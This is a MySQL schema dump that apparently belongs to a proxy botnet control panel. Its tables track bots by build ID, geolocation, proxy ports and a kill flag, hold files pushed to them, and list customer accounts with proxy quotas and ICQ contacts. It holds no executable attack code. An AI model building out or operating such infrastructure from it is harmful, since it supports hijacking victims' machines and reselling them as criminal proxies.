-- --------------------------------------------------------

-- 
-- Table structure for table `files`
-- 

CREATE TABLE `files` (
  `id` int(11) NOT NULL auto_increment,
  `url` varchar(255) NOT NULL,
  `dnum` int(11) NOT NULL default '0',
  `dtotal` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`)
);


-- --------------------------------------------------------

-- 
-- Table structure for table `opt`
-- 

CREATE TABLE `opt` (
  `name` varchar(10) NOT NULL,
  `value` varchar(255) NOT NULL,
  PRIMARY KEY  (`name`)
);

-- 
-- Dumping data for table `opt`
-- 

INSERT INTO `opt` (`name`, `value`) VALUES ('chost', ''),
('upd', '');

-- --------------------------------------------------------

-- 
-- Table structure for table `stat`
-- 

CREATE TABLE `stat` (
  `id` varchar(30) NOT NULL,
  `build_id` varchar(30) NOT NULL,
  `addr` varchar(30) NOT NULL,
  `country` varchar(2) NOT NULL,
  `country_full` varchar(30) NOT NULL,
  `city` varchar(30) NOT NULL,
  `region` varchar(30) NOT NULL,
  `sport` int(11) NOT NULL default '0',
  `hport` int(11) NOT NULL default '0',
  `ping` int(11) NOT NULL default '0',
  `speed` int(11) NOT NULL default '0',
  `last_request` int(11) NOT NULL default '0',
  `files` varchar(1024) NOT NULL,
  `kill` set('0','1') NOT NULL default '0',
  PRIMARY KEY  (`id`)
);

-- --------------------------------------------------------

-- 
-- Table structure for table `users`
-- 

CREATE TABLE `users` (
  `id` varchar(8) NOT NULL,
  `login` varchar(30) NOT NULL,
  `pass` varchar(50) NOT NULL,
  `registered` int(11) NOT NULL,
  `valid_to` int(11) NOT NULL default '0',
  `used_proxies` int(11) default '0',
  `total_proxies` int(11) NOT NULL default '0',
  `email` varchar(30) NOT NULL,
  `icq` int(11) default '0',
  `note` text NOT NULL,
  `ip` varchar(16) NOT NULL,
  `nprx` int(11) NOT NULL,
  PRIMARY KEY  (`login`)
);
